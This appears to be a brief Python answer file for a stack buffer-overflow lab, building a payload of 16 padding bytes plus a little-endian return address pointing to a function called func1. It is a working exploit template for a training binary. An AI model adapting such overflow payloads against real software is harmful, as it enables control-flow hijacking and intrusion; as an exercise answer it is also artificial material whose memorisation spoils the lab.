# answer1.py
import struct

payload  = b"A" * 16
payload += struct.pack("<Q", 0x401216)  # func1 地址，小端序 64-bit

with open("payload", "wb") as f:
    f.write(payload)
